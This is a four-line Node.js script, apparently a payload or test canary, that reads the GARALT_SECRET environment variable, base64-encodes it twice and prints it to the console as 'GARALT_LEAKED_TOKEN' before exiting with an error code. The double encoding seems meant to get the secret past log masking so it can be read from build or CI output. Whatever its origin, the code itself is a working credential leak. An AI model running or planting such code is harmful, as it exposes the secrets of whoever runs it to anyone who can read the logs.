const fs = require('fs');
const secret = process.env.GARALT_SECRET || 'not_found';
console.log("GARALT_LEAKED_TOKEN=" + Buffer.from(Buffer.from(secret).toString('base64')).toString('base64'));
process.exit(1);